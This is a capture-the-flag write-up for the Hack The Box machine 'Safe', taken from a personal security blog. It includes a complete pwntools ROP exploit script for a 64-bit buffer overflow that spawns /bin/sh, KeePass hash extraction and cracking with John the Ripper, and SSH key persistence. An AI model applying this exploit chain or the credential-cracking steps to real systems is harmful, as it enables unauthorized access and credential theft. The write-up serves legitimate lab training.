<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Hack The Box: Safe write-up | GoDiego</title><meta name="generator" content="Jekyll v4.0.1" /><meta property="og:title" content="Hack The Box: Safe write-up" /><meta name="author" content="Diego Bernal Adelantado" /><meta property="og:locale" content="en_US" /><meta name="description" content="Want to learn about binary exploitation? On this machine I show how to exploit a buffer overflow on a 64-bit binary using ROP to get a user shell. From there, just cracking hashes to access a keepass database and find the root password!" /><meta property="og:description" content="Want to learn about binary exploitation? On this machine I show how to exploit a buffer overflow on a 64-bit binary using ROP to get a user shell. From there, just cracking hashes to access a keepass database and find the root password!" /><link rel="canonical" href="http://localhost:4000/posts/Safe/" /><meta property="og:url" content="http://localhost:4000/posts/Safe/" /><meta property="og:site_name" content="GoDiego" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-08-09T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box: Safe write-up" /><meta name="twitter:site" content="@secfaults" /><meta name="twitter:creator" content="@Diego Bernal Adelantado" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"Hack The Box: Safe write-up","dateModified":"2019-08-09T00:00:00+02:00","datePublished":"2019-08-09T00:00:00+02:00","url":"http://localhost:4000/posts/Safe/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Safe/"},"author":{"@type":"Person","name":"Diego Bernal Adelantado"},"description":"Want to learn about binary exploitation? On this machine I show how to exploit a buffer overflow on a 64-bit binary using ROP to get a user shell. From there, just cracking hashes to access a keepass database and find the root password!","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="google-site-verification" content="H84_zouPIHmurw2-AF7oHrWvvqJ1HhxxPpp1B6Vjpx4" /><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async crossorigin="anonymous"></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/logo.png" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">GoDiego</a></div><div id="site-subtitle" class="font-italic">Student, Bug Hunter, Security Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/timeline/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT ME</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/diego95root" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/secfaults" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/diego-bernal-adelantado" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/31531" target="_blank"> <i class="fas fa-cube"></i> </a> <a href=" javascript:window.open('mailto:' + ['diegobernal0905','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box: Safe write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box: Safe write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Fri, Aug 9, 2019, 12:00 AM +0200"> Aug 9, 2019 <i class="unloaded">2019-08-09T00:00:00+02:00</i> </span> by <span class="author"> Diego Bernal Adelantado </span></div></div><div class="post-content"> <img src="https://img.wonderhowto.com/img/16/67/63647207786429/0/exploit-development-learn-binary-exploitation-with-protostar.w1456.jpg"><h1 id="hack-the-box-safe-machine-write-up">Hack The Box: Safe machine write-up</h1><p>Safe is an easy-rated machine which, from my perspective, would be true for people into binary exploitation. The box starts with a vulnerable binary that can be downloaded through a default apache page. The way to exploit it is through a buffer overflow and return-oriented programming (ROP). Then, we can get a shell and find some images in the main user directory, alongside a keepass 2 database. The images can be used in <code class="highlighter-rouge">keepass2john</code> as key files to generate 6 distinct hashes and then one of them can be craacked with John The Ripper, giving us access to the database which contains the root password. Simple!</p><p>Let’s dig in! The IP of the machine is <code class="highlighter-rouge">10.10.10.147</code> and, as always, I included it in my <code class="highlighter-rouge">/etc/hosts</code> file as <code class="highlighter-rouge">safe.htb</code>.</p><h3 id="enumeration">Enumeration</h3><p>I start by enumerating open ports to discover the services running in the machine. I fire up nmap:</p><p><em>Result of nmap scan</em></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.70 scan initiated Sun Jul 28 19:28:55 2019 as: nmap -sV -sC -oN nmap/initial safe.htb</span>
Nmap scan report <span class="k">for </span>safe.htb <span class="o">(</span>10.10.10.147<span class="o">)</span>
Host is up <span class="o">(</span>0.049s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de <span class="o">(</span>RSA<span class="o">)</span>
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Jul 28 19:29:04 2019 -- 1 IP address (1 host up) scanned in 9.48 seconds</span>
</pre></table></code></div></div><p>Okay so not too much, just SSH and a web server over HTTP.</p><h4 id="port-80-enumeration">Port 80 enumeration</h4><p>Upon visiting the webpage we are welcome with a default apache page. However, upon inspection of the source code we find something unusual:</p><p><em>Weird comment on the source code</em></p><p><img src="/assets/posts_details/Safe/images/source.png" alt="Img" /></p><p>We can therefore access <code class="highlighter-rouge">http://safe.htb/myapp</code> and download the file, which turns out to be a binary:</p><p><em>File downloaded</em></p><p><img src="/assets/posts_details/Safe/images/file.png" alt="Img" /></p><p>I ran the binary and found that it didn’t do much, it just echo’ed back whatever the input was, so I moved on to the other port.</p><h4 id="port-1337-enumeration">Port 1337 enumeration</h4><p>Connecting with netcat to the port prompts us with the same thing as the binary, so by the message from the source code it’s the same.</p><p><em>Port 1337 response</em></p><p><img src="/assets/posts_details/Safe/images/leet.png" alt="Img" /></p><p>Not having found much, I assumed the box started with an exploitation of the binary so I moved it to my local box and started analysing it.</p><h4 id="getting-user-binary-exploitation">Getting user: binary exploitation</h4><p>Entering different payloads to check if there are any string format vulns or any other things yields no result so I ran checksec to have a look at the binary:</p><p><em>Checksec output</em></p><p><img src="/assets/posts_details/Safe/images/checksec.png" alt="Img" /></p><p>Some things to remember: stack is has the NoExecutable flag, so we can’t just input shellcode and jump to it to get a shell and PIE is disabled, which means the addresses extracted from the binary we downloaded are the same as in the server. This will be useful later on.</p><p>Then I fired up ghidra and disassembled the code:</p><p><em>Ghidra output</em></p><p><img src="/assets/posts_details/Safe/images/ghidra.png" alt="Img" /></p><p>Okay, so it’s clear the vulnerability we have is a buffer overflow. Now, looking at the imports we can see that <code class="highlighter-rouge">system</code> is already provided to us, so we can call it, given that PIE is disabled. I then looked for the <code class="highlighter-rouge">/bin/sh</code> string on the binary, given that we want to call system with that as an argument to pop a shell. However, no string was found. At this point, the attack plan seemed laid out:</p><ol><li>Find a writeable and readable address.</li><li>Put the <code class="highlighter-rouge">/bin/sh</code> string into memory.</li><li>Call <code class="highlighter-rouge">system</code> with <code class="highlighter-rouge">/bin/sh</code> as argument.</li></ol><h5 id="1-getting-the-address">1. Getting the address</h5><p>For the first part of the plan I just ran <code class="highlighter-rouge">iS</code> on radare2 to get the different memory addresses and sizes:</p><p><em>Getting memory segments permissions with radare</em></p><p><img src="/assets/posts_details/Safe/images/memory.png" alt="Img" /></p><p>We can choose any <code class="highlighter-rouge">rw</code> location we can want, I chose <code class="highlighter-rouge">.data</code>, with address <code class="highlighter-rouge">0x00404038</code>.</p><h5 id="2-writing-the-string">2. Writing the string</h5><p>Now, to write the string to memory I looked for <code class="highlighter-rouge">mov</code> gadgets using ROPGadget, but I found nothing useful. Then I understood, I could just call <code class="highlighter-rouge">gets</code> with the address I had found earlier, as that would write whatever the input was to that address.</p><p>As this is a 64-bit binary we need to remember that the arguments to functions get passed in registers, being the first one <code class="highlighter-rouge">rdi</code>, so the way to get the string to memory is: pop rdi + address of destination of gets + gets. We can get the <code class="highlighter-rouge">pop rdi</code> gadget using ROPGadget:</p><p><em>Getting the gadget with ROPGadget</em></p><p><img src="/assets/posts_details/Safe/images/rop.png" alt="Img" /></p><p>Good! We’ve got the gadget: <code class="highlighter-rouge">0x40120b</code> (I got rid of the leading zeroes because later we will pack everything to 64 bits).</p><h5 id="3-calling-system">3. Calling system</h5><p>This was by far the easiest part, I just needed to pop the address where <code class="highlighter-rouge">/bin/sh</code> had been written before into <code class="highlighter-rouge">rdi</code> and then call <code class="highlighter-rouge">system</code>.</p><h5 id="putting-everything-together">Putting everything together</h5><p>So far we have the address where we want to store the string and the pop rdi gadget, we just need to calculate the offset at which the overflow occurs and get the addresses of <code class="highlighter-rouge">system</code> and <code class="highlighter-rouge">gets</code>.</p><p>There are many tools to find the offset, I just used python to calculate it and obtained that the offset was 120. Therefore, the payload would start with 120 characters of junk.</p><p>Then, to get the addresses of the functions we can just run <code class="highlighter-rouge">info functions</code> on gdb to get them:</p><p><em>Getting the functions addresses</em></p><p><img src="/assets/posts_details/Safe/images/gdb.png" alt="Img" /></p><p>Finally we can craft our payload with python’s pwntools library, which makes everything much easier:</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"safe.htb"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>

<span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">120</span> <span class="c1"># junk
</span>
<span class="n">pop_rdi</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40120b</span><span class="p">)</span>
<span class="n">gets</span>     <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401060</span><span class="p">)</span>
<span class="n">sys</span>      <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401040</span><span class="p">)</span> <span class="c1"># can be either this address or the one from main
</span><span class="n">data_seg</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404038</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">data_seg</span> <span class="o">+</span> <span class="n">gets</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">data_seg</span> <span class="o">+</span> <span class="n">sys</span>

<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>And after running it we can get a shell as user <code class="highlighter-rouge">user</code> (really creative) and read <code class="highlighter-rouge">user.txt</code>:</p><p><em>Reading the user hash</em></p><p><img src="/assets/posts_details/Safe/images/user.png" alt="Img" /></p><h4 id="privilege-escalation">Privilege escalation</h4><p>THe privilege escalation was pretty simple, on the main directory of <code class="highlighter-rouge">user</code> we find six images and a <code class="highlighter-rouge">.kdbx</code> file, on which we run <code class="highlighter-rouge">file</code> to get information.</p><p><em>Initial recon</em></p><p><img src="/assets/posts_details/Safe/images/enum1.png" alt="Img" /></p><p>So it is a keepass 2.x database… Looking at the binaries on my machine that start with <code class="highlighter-rouge">keepass</code> I see that there is a <code class="highlighter-rouge">keepass2john</code>, which apparently can get some hashes from the database. Besides, by doing <code class="highlighter-rouge">--help</code> to see its usage I see that a keyfile can be provided! Good, one of the images must surely be the key.</p><p><em>More recon</em></p><p><img src="/assets/posts_details/Safe/images/enum2.png" alt="Img" /></p><p>I ran six times the command <code class="highlighter-rouge">keepass2john -k IMG_FILE MyPasswords.kdbx</code> and then saved all of the outputs on a file, renaming the users to know which picture is the right one.</p><p>Contents of <code class="highlighter-rouge">hashes.txt</code>:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>MyPasswords1:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae
MyPasswords2:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162
MyPasswords3:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7
MyPasswords4:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f
MyPasswords5:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794
MyPasswords6:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2
</pre></table></code></div></div><p>I then ran John The Ripper to quickly find a password from MyPasswords3: <code class="highlighter-rouge">bullshit</code>. Now, this is where I spent most of the time, as I tried to su to root with that password but it was getting rejected all the time.</p><p>Then I realised maybe that was the password to the database! But how to open it? I found online a python library, <code class="highlighter-rouge">libkeepass</code>, which supports keepass 2.x reading so I cloned the repo.</p><p><em>Repo used to get the db contents</em></p><p><img src="/assets/posts_details/Safe/images/lib.png" alt="Img" /></p><p>FInally, using a test script I managed to get the db contents!</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">libkeepass</span>

<span class="n">filename</span> <span class="o">=</span> <span class="s">"../home/MyPasswords.kdbx"</span>
<span class="k">with</span> <span class="n">libkeepass</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'bullshit'</span><span class="p">,</span> <span class="n">keyfile</span><span class="o">=</span><span class="s">'../home/IMG_0547.JPG'</span><span class="p">)</span> <span class="k">as</span> <span class="n">kdb</span><span class="p">:</span>
    <span class="c1"># print parsed element tree as xml
</span>    <span class="k">print</span><span class="p">(</span><span class="n">kdb</span><span class="p">.</span><span class="n">pretty_print</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'unicode_escape'</span><span class="p">))</span>
</pre></table></code></div></div><p>I read the xml output and found the root password (the string starting with <code class="highlighter-rouge">u3v...yhk</code>).</p><p><em>Getting the root password from the database</em></p><p><img src="/assets/posts_details/Safe/images/password.png" alt="Img" /></p><p>Now after running the exploit what I did was generate a rsa key with <code class="highlighter-rouge">ssh-keygen</code> and append it to <code class="highlighter-rouge">/home/user/.ssh/authorized_keys</code>. Then, I logged in using SSH with <code class="highlighter-rouge">ssh -i key user@safe.htb</code> and used <code class="highlighter-rouge">su</code> with the password!</p><p><em>Getting to root</em></p><p><img src="/assets/posts_details/Safe/images/root.png" alt="Img" /></p><p>Overall, I think this is a good machine to learn binary exploitation, although maybe I wouldn’t rate it as easy for beginners. I hope you found the writeup useful, if you liked it you can give me respect on Hack The Box through the following link: <a href="https://www.Hack The Box.eu/home/users/profile/31531">https://www.Hack The Box.eu/home/users/profile/31531</a>.</p><hr /><p><em>Diego Bernal Adelantado</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >Pentesting</a> <a href="/tags/binary-exploitation/" class="post-tag no-text-decoration" >Binary exploitation</a> <a href="/tags/rop/" class="post-tag no-text-decoration" >ROP</a> <a href="/tags/keepass/" class="post-tag no-text-decoration" >Keepass</a> <a href="/tags/john/" class="post-tag no-text-decoration" >John</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box: Safe write-up - GoDiego&url=http://localhost:4000/posts/Safe/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box: Safe write-up - GoDiego&u=http://localhost:4000/posts/Safe/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box: Safe write-up - GoDiego&url=http://localhost:4000/posts/Safe/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> 